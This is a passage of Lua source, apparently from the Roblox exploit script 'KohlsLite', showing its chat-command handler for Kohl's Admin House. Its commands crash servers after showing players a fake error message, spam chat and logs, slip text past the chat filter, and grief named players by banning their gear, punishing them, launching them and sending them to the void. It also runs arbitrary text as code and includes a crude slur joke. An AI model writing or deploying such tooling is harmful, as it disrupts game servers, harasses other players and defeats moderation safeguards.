    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antiflash' then
        antiflash = true
	Remind("Enabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantiflash' then
        antiflash = false
	Remind("Disable this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antifogend' then
        antifogend = true
	Remind("Enabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantifogend' then
        antifogend = false
	Remind("Disable this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antiilight' then
        antiilight = true
	Remind("Enabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantiilight' then
        antiilight = false
	Remind("Disable this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'antifogstart' then
        antifogstart = true
	Remind("Enabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 14) == prefix..'unantifogstart' then
        antifogstart = false
	Remind("Disable this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antifogc' then
        antifogcolor = true
	Remind("Enabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantifogc' then
        antifogcolor = false
	Remind("Disable this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antitime' then
        antitime = true
	Remind("Enabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantitime' then
        antitime = false
	Remind("Disable this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antiamb' then
        antiambient = true
	Remind("Enabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantiamb' then
        antiambient = false
	Remind("Disable this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'antitrip' then
        antitripmine = true
	Remind("Enabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unantitrip' then
        antitripmine = false
	Remind("Disable this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antiegg' then
        antiegg = true
	Remind("Enabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantiegg' then
        antiegg = false
	Remind("Disable this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antiplant' then
	antiplant = true
	Remind("Disable this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantiplant' then
	antiplant = false
	Remind("Disable this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antibright' then
        antibrightness = true
	Remind("Enabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantibright' then
        antibrightness = false
	Remind("Disabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'antioutamb' then
        antioutamb = true
	Remind("Enabled this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'unantioutamb' then
        antioutamb = false
	Remind("Disable this anti!")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'adv' then
       ADVERTISEMENT()
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'cadv' then
       CADVERTISEMENT()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'ipboom' then
        IPBOOM()
	Remind("when the sus?!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'logspam' then
       LogSpam()
       Remind("Logs have been spammed!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'logtrap' then -- scv1
        LogTrap()
	Remind("Don't do 'logs'...")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'logmode' then
        lmode = string.sub(msg:lower(), #prefix + 9)
	if lmode == "default" then
		logmode = "default"
	elseif lmode == "crack" then
		logmode = "crack"
	else
		Remind("Log mode must be default or crack.")
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'persons' then
		haspersons = true
		Remind("Manually set - persons true.")
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unpersons' then
		haspersons = false
		Remind("Manually set - persons false.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'peadmin' then
		hasperm = true
		Remind("Manually set - perm true.")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unpeadmin' then
		hasperm = false
		Remind("Manually set - perm false.")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'tptool' then
        InitTool()
        Remind("You should have been given a TP tool now!")
    end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'supercmd' then
        supermessage = string.sub(msg, #prefix + 10)
        SuperCMD(supermessage)
	Remind("Supercmding your message...")
    end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'supert' then
        amon = tonumber(string.sub(msg:lower(), #prefix + 8))
        Remind("Supercmd amount has been modified.")
    end

   if string.sub(msg, 1, #prefix + 5) == prefix..'spamt' then
        spamtext = string.sub(msg, #prefix + 7)
        spam = true
        spamon = true
        Remind("Spamming the requested text!")
    end

   if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unspamt' then
        spam = false
        spamon = false
        Remind("Stopped spamming the requested text!")
    end

   if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'chatz' then
        ChatFudge()
	Remind("Crapping on the chat filter.")
   end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'spamw' then
        spamwait = tonumber(string.sub(msg:lower(), #prefix + 7))
        Remind("Spam wait has been modified!")
    end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'spamwait' then
        spamwait = tonumber(string.sub(msg:lower(), #prefix + 10))
        Remind("Spam wait has been modified!")
    end

   if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'spamoff' then
        spamon = false
	Remind("Spamming has been paused.")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'spamon' then
        spamon = true
	Remind("Spamming has been resumed.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'cbtools' then
                local cbt = string.sub(msg:lower(), #prefix + 9)
                if cbt ~= "" then
                                Chat("gear " .. cbt .. " 16200204")
                                Chat("gear " .. cbt .. " 16200402")
                                Chat("gear " .. cbt .. " 16969792")
                                Chat("gear " .. cbt .. " 73089190")
                else
                                Chat("gear me 16200204")                                        
                                Chat("gear me 16200402")
                                Chat("gear me 16969792")                                        
                                Chat("gear me 73089190")
                end
		Remind("Client btools given.")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'ecrash' then
        	Chat("fix") -- ;Chat(prefix.."perm2")
        	musicsay = false
        	-- task.wait(0.5)
		-- Chat(prefix.."unantimsg")
            	Chat("h \n\n\n Error occured. Please join a different server. \n\n\n")
		Chat(prefix.."gmusic84")
		--  Chat(prefix.."byp ")
           	Chat("fogcolor 0 0 0")
		Chat("time 0")
		Chat("fogend 0")
		Chat("paint all black")
            	task.wait(1.5)
		skipwarncrash = true
            	DCrash()        
    end
  
    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'dicrash' then
		musicsay = false
        	Chat(prefix.."gchar all D_ionte")
		Chat(prefix.."gmusic62")
		Chat("h \n\n\n all praise dionte \n\n\n")
		Chat("name all Dionte is our hero!")
		task.wait(1.5)
		skipwarncrash = true
		DCrash()
    end
  
    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'fredcrash' then
		musicsay = false 
		Chat(prefix.."gchar all FR6DDiie")
		Chat(prefix.."gmusic41")
		Chat("h \n\n\n all praise fred \n\n\n")
		Chat("name all Fred is our hero!") 
		task.wait(1.5)
		skipwarncrash = true
		DCrash()
    end

  
    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'chcrash' then
 		local args = string.split(msg, " ")
        	local specialid = args[2]
		if #args >= 2 then
        		mehcrashchariz = game.Players:GetUserIdFromNameAsync(specialid)
		else
			local myusername = game.Players.LocalPlayer.Name
			mehcrashchariz = game.Players:GetUserIdFromNameAsync(myusername) 
		end
			
        	Chat("char all " .. mehcrashchariz)
		task.wait(1.5)
		skipwarncrash = true
		DCrash()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'rockmap' then
        StoneMap()
        Remind("Wait around 10 seconds for the effect to be permanent.")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'stonemap' then
        StoneMap()
        Remind("Wait around 10 seconds for the effect to be permanent.")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'hammer' then
        SpHammer()
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'platform' then
		if Loops.platform then 
			return Remind("You already have a platform!")
		else
			Remind("Setting a platform up...")
	        	Loops.platform = true
			Platform()
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'noplatform' then
		Remind("Removing the platform...")
		Loops.platform = false  
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'float' then
		Remind("Adding the platform...")
		float()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unfloat' then
		Remind("Removing the platform...")
		unfloat()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'icemap' then
		if IsOnMobile then
                	return Remind("You have been detected as being on mobile. This command will not run to prevent crashing.")
		end
		if firetouchinterest then
                	Remind("If you crash... that sucks!")
               		IceMap()
		else
			Remind("Sorry, your exploit does not support this command (firetouchinterest)")
	        end
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'byp' then -- created by tech-187, open source on his repo :)
        local args = string.split(msg, " ")
        local cmd = args[1]
        local bypsed = table.concat(args, " ", 2)
        local file = bypsed
        local a = {}

        for letter in file:gmatch(".") do
                  if letter ~= "\r" and letter ~= "\n" then
                            table.insert(a, letter)
                  end
        end

        for b, c in ipairs(a) do
                    local d = "variable_" .. tostring(b)
                   _G[d] = c
        end

        for b, c in ipairs(a) do -- it works but i still don't care if it sometimes doesn't bypass!
                    local e = string.rep("  ", 2 * (b - 1))
                if haspersons == true then
                        Chat("h/KohlsLite ez\n\n\n\n\n\n\n\n\n\n" .. e .. _G["variable_" .. tostring(b)])
                else
                            Chat("h KohlsLite ez\n\n\n\n\n\n\n\n\n\n" .. e .. _G["variable_" .. tostring(b)])
                end
        end
    end

     if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'nbyp' then -- my version (might work better)
			local args = string.split(msg, " ")
        		local cmd = args[1]
            		local bypsed = table.concat(args, " ", 2)
			local a = bypsed

			local chars = {}
			for char in a:gmatch(".") do
    				table.insert(chars, char)
			end

			for i, char in ipairs(chars) do
    				local spaces = string.rep(" ", (i-1) * 4)
	               		if haspersons == true then
    					Chat("h/KohlsLite ez\n\n\n\n\n\n\n\n\n\n" .. spaces .. char)
				else
					Chat("h KohlsLite ez\n\n\n\n\n\n\n\n\n\n" .. spaces .. char)
				end
			end
    end
		
    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'sregen' then
        SRegen = true
	Remind("Non-perm players can no longer get admin.")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unsregen' then
        SRegen = false
	Remind("Non-perm players can now get admin again.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'autogpc' then
        autogpcheck = true
	Remind("Now checking players for perm and persons upon joining.")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unautogpc' then
        autogpcheck = false
	Remind("No longer checking players for perm and persons upon joining.")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'padban' then
         local dasplayer = string.sub(msg:lower(), #prefix + 8)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
		if blwl_an then
                	Chat("h \n\n\n "..player.." has been padbanned. \n\n\n")
		end
                table.insert(padbanned, player)
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
    end

    if string.sub(msg, 1, #prefix + 8) == prefix..'unpadban' then
         local dasplayer = string.sub(msg:lower(), #prefix + 10)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
		if blwl_an then
               		Chat("h \n\n\n "..player.." has been unpadbanned! \n\n\n")
		end
                table.remove(padbanned, table.find(padbanned, player))
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
    end

    if string.sub(msg, 1, #prefix + 8) == prefix..'padreinf' then
	if blwl_an then
        	Chat("h \n\n\n Pad reinforcements are on. \n\n\n")
	end
        padreinforcements = true
	Remind("Pad reinforcements are on.")
    end

    if string.sub(msg, 1, #prefix + 10) == prefix..'unpadreinf' then
	if blwl_an then
        	Chat("h \n\n\n Pad reinforcements are off! \n\n\n")
	end
        padreinforcements = false
	Remind("Pad reinforcements are off.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'qattach' then
        Chat("sit me down");task.wait(1)
        Chat("punish me");task.wait(1)
        Chat("unpunish me")
	Remind("Quick attach is done.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'biglogs' then
	    danum = tonumber(string.sub(msg:lower(), #prefix + 9))
	    if danum == "" then
            		game.Players.LocalPlayer.PlayerGui:FindFirstChild("ScrollGui").TextButton.Frame.Size = UDim2.new(0,1000,0,1000)
	    else
			game.Players.LocalPlayer.PlayerGui:FindFirstChild("ScrollGui").TextButton.Frame.Size = UDim2.new(0,danum,0,danum)
	    end
	    Remind("If you did this on mobile... you're dumb.")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'regen' then
        Regen()
	Remind("Reset the admin pads.")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'house' then
        House()
	Remind("Teleported to the house.")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'spawn' then
        GSpawn()
	Remind("Teleported to spawn.")
    end

    if string.sub(msg:lower(), 1, 3)  == ',re' then
        Chat("reset me"); Remind("Reset you.")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'hhouse' then
       if haspersons then Chat("invis/me") else Chat("invis me") end
       task.wait(.35)
       House()
       task.wait(.35)
       if haspersons then Chat("vis/me") else Chat("vis me") end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'phelp' then
        local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        phelper = string.sub(msg:lower(), #prefix + 7)
        House()
        task.wait(0.5)
        if phelper ~= "" then        
                Chat("tp "..phelper.." me")
        else
                Chat("tp all me")
        end
	if phelper ~= "all" and phelper ~= "" then
		task.wait(0.5)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
	end
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'void' then -- kohlsnoob
		local fakehelperhaha = string.sub(msg:lower(), #prefix + 6)
       		local opos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, -200, 0)
		task.wait(.45)
		Chat("tp "..fakehelperhaha.." me")
		Chat("unfly "..fakehelperhaha)
		task.wait()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = opos
		Remind("Player has been sent to the void!")
    end

    if string.sub(msg, 1, #prefix + 7) == prefix..'execute' then
        Execute(string.sub(msg, #prefix + 9))
	Remind("Executed the text!")
    end

    if string.sub(msg, 1, #prefix + 8) == prefix..'announce' then
        annsecret = string.sub(msg, #prefix + 10)
        Announce()
    end

    if string.sub(msg, 1, #prefix + 9) == prefix..'cannounce' then -- inspired by scv3-var
        local args = string.split(msg, " ")
        local dasplayer = args[2]
        PLAYERCHECK(dasplayer)
        if player ~= nil then
                        sus = player
                        whatsapp = table.concat(args, " ", 3)
                        AnnounceWM()
        else
                	Remind('Cannot find player with the name: '..dasplayer)
        end
    end

    if string.sub(msg, 1, #prefix + 6) == prefix..'shlong' then
		if haspersons == false then
Remind([[Sorry, you don't have Person's to perform this command!
Commands required: part]])
return
		end
		local args = string.split(msg, " ")
		if #args == 3 then
        		local dasplayer = args[2]
			PLAYERCHECK(dasplayer)
			if player ~= nil then
				puser = cplr
				local len = tonumber(args[3])
				Loops.pp = true
				pp(puser, len)
			else
				Remind('Cannot find player with the name: '..dasplayer)
			end		
		else
			Remind("Invalid amount of arguments. (it should be 3)")
		end
    end

    if string.sub(msg, 1, #prefix + 8) == prefix..'unshlong' then
		if haspersons == false then
Remind([[Sorry, you don't have Person's to perform this command!
Commands required: part]])
return
		end
		local args = string.split(msg, " ")
		if #args == 2 then
        		local dasplayer = args[2]
			PLAYERCHECK(dasplayer)
			if player ~= nil then
				Loops.pp = false
			else
				Remind('Cannot find player with the name: '..dasplayer)
			end		
		else
			Remind("Invalid amount of arguments. (it should be 2)")
		end
    end

    if string.sub(msg, 1, #prefix + 7) == prefix..'dncycle' then
		Loops.dncycle = true
		dncycle()
		Remind("Day and night cycle started.")
    end

    if string.sub(msg, 1, #prefix + 9) == prefix..'undncycle' then
		Loops.dncycle = false
		Remind("Day and night cycle ended.")
    end

    if string.sub(msg, 1, #prefix + 5) == prefix..'arena' then
		if haspersons == false then
Remind([[Sorry, you don't have Person's to perform this command!
Commands required: part]])
return
		end
		local args = string.split(msg, " ")
		if #args == 3 then
				local plr1 = args[2]
				local plr2 = args[2]
				arena(plr1, plr2)
				Remind("Building the arena")
		else
				Remind("Please give 3 arguments - arena (plr1) (plr2).")
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'prefix' then
        prefix = string.sub(msg:lower(), #prefix + 8)
	Remind("Changed the prefix!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'goodexec' then
	Remind("Created by Tech (Tech-187)")

	getgenv().scapproved = {
		"Fluxus", -- provided you don't use the RAT one (non silent caliber)
		"Delta" -- i agree with these, codex and arceus x (and probably vega x too) suck
	}

	local function check(d, e)
		for f, g in ipairs(e) do
			if g == d then
				return true
			end
		end;
		return false
	end;

	if check(identifyexecutor(), scapproved) then
		print("Your executor is SC Approved!")
	else
		print("Your executor is NOT SC Approved.")
	end
    end

    if string.sub(msg:lower(), 1, 7) == 'cprefix' then
        Remind("Your current prefix is "..prefix)
    end

    if string.sub(msg:lower(), 1, 6) == 'sneban' then
        Speak("I'm gonna say the s word. You are a filthy snekkur ngl")
    end

    if string.sub(msg:lower(), 1, 6) == 'cmp' then
	Speak("collect my pages...")
    end

   if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'pmap' then
		local colourhere = string.sub(msg, #prefix + 6)
		PaintMap(colourhere,"norm")
		Remind("Painted the map!")
   end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'paintmap' then
		local colourhere = string.sub(msg, #prefix + 10)
		PaintMap(colourhere,"norm")
		Remind("Painted the map!")
   end

  if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'messpaint' then
		PaintMap(colourhere,"random")
		Remind("Ruined the map's paint!")
   end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'rbgmap' then
		local args = string.split(msg, " ")
		r = args[2] 
		g = args[3]
		b = args[4]
		PaintMap_2(r,g,b)
		Remind("Painted the map (rbg)!")
   end
		
 if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'rmap' then
		if Loops.rainbowmap == false then
			Loops.rainbowmap = true
			rmap()
			Remind("Rainbow map is now enabled.")
		else
			Loops.rainbowmap = false
			Remind("Disabled since it was already enabled!")
		end
   end

 if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'rbase' then
		if Loops.rbase == false then
			Loops.rbase = true
			rbase()
			Remind("Rainbow baseplate is now enabled.")
		else
			Loops.rbase = false
			Remind("Disabled since it was already enabled!")
		end
   end

 if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'rfog' then
		deran = tonumber(string.sub(msg:lower(), #prefix + 6))
		if Loops.rfog == false then
			Loops.rfog = true
			rfog(deran)
			Remind("Rainbow fog is now enabled.")
		else
			Loops.rfog = false
			Remind("Disabled since it was already enabled!")
		end
   end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'unrmap' then
		Loops.rainbowmap = false
		Remind("Run fixpaint to fix the map's colours now!")
   end

   if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unrbase' then
		Loops.rbase = false
		Remind("Run fixpaint to fix the baseplate's colour now!")
   end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'unrfog' then
		Loops.rfog = false
		Remind("Rainbow fog is now disabled")
		Chat("fix")
   end

   if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'autoafk' then
        autoafk = true
	Remind("Auto afk is now enabled.")
   end

   if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unautoafk' then
        autoafk = false
	Remind("Auto afk is now disabled.")
   end

   if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'antilag' then
        antilag = true
	Remind("Anti Lag is now enabled.")
   end

   if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unantilag' then
        antilag = false
	Remind("Anti Lag is now disabled.")
   end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'capfps' then
	local sfc = tonumber(string.sub(msg:lower(), #prefix + 8))
	if setfpscap and type(setfpscap) == "function" then
		local num = sfc or 1e6
		if num == 'none' then
			return setfpscap(1e6)
		elseif num > 0 then
			return setfpscap(num)
		else
			return Remind("Please provide a number above 0 or 'none'.")
		end
	else
		return Remind("Sorry, your exploit does not support fps changing (setfpscap)")
	end
   end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'alladmin' then
	alladmin = true
	Chat("h \n\n\n Everyone has been given admin! Chat any command. \n\n\n")
	Remind("All admin enabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'unalladmin' then
	alladmin = false
        Chat("h \n\n\n Free admin is off. \n\n\n")
	Remind("All admin disabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'nok' then
                NOK()
		Remind("You will no longer die to the obby!")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'2nok' then
                NOK2()
		Remind("You will no longer die to the obby! (2)")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'3nok' then
                NOK3()
		Remind("You will no longer die to the obby! (3)")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'tnok' then
                TNOK("true")
		Remind("You will no longer die to the obby!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'untnok' then
                TNOK("false")
		Remind("You can die to the obby again!")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'getping' then
                GetPing()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'autogb' then
                autogb = true
		Remind("Auto gearban is enabled. People get gearbanned when they join this server")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unautogb' then
                autogb = false
		Remind("Auto gearban is now disabled.")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'qpunish' then -- idea from zercon
                	local trolled = string.sub(msg:lower(), #prefix + 9)
                        Chat("punish " .. trolled)
                        Regen()
			Remind("Quick punished the player")
    end   

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'spunish' then -- ii's admin
                	local trolled = string.sub(msg:lower(), #prefix + 9)
                        Chat("speed "..trolled.." inf")
			Remind("Sped the player to infinity!")
    end   

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'gpunish' then -- ii's admin
                	local trolled = string.sub(msg:lower(), #prefix + 9)
                        Chat("setgrav "..trolled.." -9e9")
			Remind("Setgraved player to the heavens!")
    end   

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'ungearban' then
                local plrg = string.sub(msg:lower(), #prefix + 11)
                if plrg == "" or plrg == "me" then
                        game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
			Remind("Ungearbanned yourself.")
                else 
                        Ungearban(plrg)
                end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'gearban' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 9)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        xplayer = player
                        xplr = cplr
                        Gearban()
                 else
                        Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'rail' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 6)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        railer = player
                        Rail()
                 else
                        Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'lemonman' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 10)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        lemonman = player
                        lman = cplr
                        Lemon()
                 else
                        Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'laser' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 7)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        laserman = player
                        laman = cplr
                        Laser()
                 else
                        Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'surround' then
                 local dasplayer = string.sub(msg:lower(), #prefix + 10)
                 PLAYERCHECK(dasplayer)
                 if player ~= nil then
                        surrer = player
                        Surround("sur")
                 else
                        Remind('Cannot find player with the name: '..dasplayer)
                 end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'rnuke' then
		local args = string.split(msg, " ")
        	if #args == 3 then
                	range = tonumber(args[2])
			amount = tonumber(args[3])
			RNuke(amount, range)
		else
			Remind("Invalid amount of arguments. (it should be 3)")
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'dnuke' then
 		local args = string.split(msg, " ")
        	if #args == 3 then
            		local amount = tonumber(args[2])
			local range = tonumber(args[3])
			local user = nil
			RoNuke(amount, range, user)
		elseif #args == 2 then
			local tar = args[2]
			PLAYERCHECK(tar)
			if tar ~= nil then
				local amount = nil
				local range = nil
				user = cplr
				RoNuke(amount, range, user)
			else
				Remind("Player doesn't exist!")
			end
		else
			Remind("Invalid amount of arguments. (it should be 2 or 3)")
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'jnuke' then
		local args = string.split(msg, " ")
        	if #args == 1 then
			dj = "default"
			jnu = nil
			JNUKE(dj, jnu)
		elseif #args == 2 then
            		local target = args[2]
                 	PLAYERCHECK(target)
                 	if target ~= nil then
                        	dj = "player"
				jnu = cplr
				JNUKE(dj, jnu)
			else
                               Remind('Cannot find player with the name: '..dasplayer)
                        end
		else
			Remind("Invalid amount of arguments. (it should be 1 or 2)")
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'rcannon' then
		rcannon("def")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'wrcannon' then
		rcannon("wide")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'uncannon' then
    	        Connections.cannoning:Disconnect()

    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'astrike' then
		ASTRIKE()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unastrike' then
		Connections.airstrike:Disconnect()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'skcraze' then
		SKCRAZE()
		skf = true
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'unskcraze' then
		skf = false
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'weld' then
                local args = string.split(msg, " ")
        	if #args >= 3 then
            		local target = args[2]
                 	PLAYERCHECK(target)
                 	if target ~= nil then
                        	welder = player
				wld = cplr
				mode = table.concat(args, " ", 3)
                        	Welding(mode)
                 	else
                               Remind('Cannot find player with the name: '..dasplayer)
                	 end
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'nweld' then
                local args = string.split(msg, " ")
        	if #args >= 2 then
            		local target = args[2]
                 	PLAYERCHECK(target)
                 	if target ~= nil then
                        	welder = player
				wld = cplr
                        	NewW(welder, wld)
                 	else
                               Remind('Cannot find player with the name: '..dasplayer)
                	 end
		end
    end
		
    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'hfreeze' then
                local args = string.split(msg, " ")
        	if #args == 2 then
            		local target = args[2]
                 	PLAYERCHECK(target)
                 	if target ~= nil then
                        	welder = player
				wld = cplr
                        	HFreeze()
                 	else
                               Remind('Cannot find player with the name: '..dasplayer)
                	 end
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'tattach' then
                local args = string.split(msg, " ")
        	if #args == 2 then
            		local target = args[2]
                 	PLAYERCHECK(target)
                 	if target ~= nil then
                        	welder = player
				wld = cplr
                        	TAttach()
                 	else
                               Remind('Cannot find player with the name: '..dasplayer)
                	 end
		end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'acton' then
		local args = string.split(msg, " ")
        	if #args == 3 then
			local act = args[2]
			local getnumber = args[3]
			if act == "clone" then
				Clone(getnumber)
				Remind("Action: Clone")
			elseif act == "table" or act == "raig" then
		                Table(getnumber)
				Remind("Action: Table")
			elseif act == "potion" or act == "dance" then
				Potion(getnumber)
				Remind("Action: Potion")
			elseif act == "tripmine" or act == "trip" then
				MineTrip(getnumber)
				Remind("Action: Tripmine")
			elseif act == "spike" then
                		Spike(getnumber)
		 		Remind("Action: Spike")
			elseif act == "cannon" then
		                Cannon(getnumber)
				Remind("Action: Cannon")
			elseif act == "zombie" then
				Zombie(getnumber)
				Remind("Action: Zombie")
			elseif act == "alpaca" then
				Alpaca(getnumber)
				Remind("Action: Alpaca")
			elseif act == "piano" or act == "mozart" then
		                Piano(getnumber)
				Remind("Action: Piano")
			elseif act == "bdrop" or act == "bassdrop" then
		                Bassdrop(getnumber)
				Remind("Action: Bassdrop")
			elseif act == "cstory" or act == "coolstory" then
		                Coolstory(getnumber)
				Remind("Action: Coolstory")
